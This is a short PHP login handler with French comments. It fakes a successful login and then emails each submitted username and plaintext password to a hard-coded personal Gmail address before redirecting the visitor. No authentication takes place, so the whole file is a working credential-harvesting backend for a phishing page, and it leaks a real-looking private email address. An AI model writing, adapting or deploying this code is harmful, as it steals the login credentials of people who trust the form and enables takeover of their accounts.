<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Simuler une connexion réussie
    $_SESSION['loggedin'] = true;
    $_SESSION['username'] = $_POST['username'];
    
    // Récupérer les informations du formulaire
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Adresse e-mail à laquelle envoyer les informations (à changer)
    $to = "martinlouail2008@gmail.com";
    $subject = "Nouvelle tentative de connexion";
    $message = "Nom d'utilisateur : $username\nMot de passe : $password";
    $headers = "From: noreply@example.com";

    // Envoyer l'e-mail
    mail($to, $subject, $message, $headers);

    // Redirection après la "connexion"
    header("Location: welcome.php");
    exit();
}
?>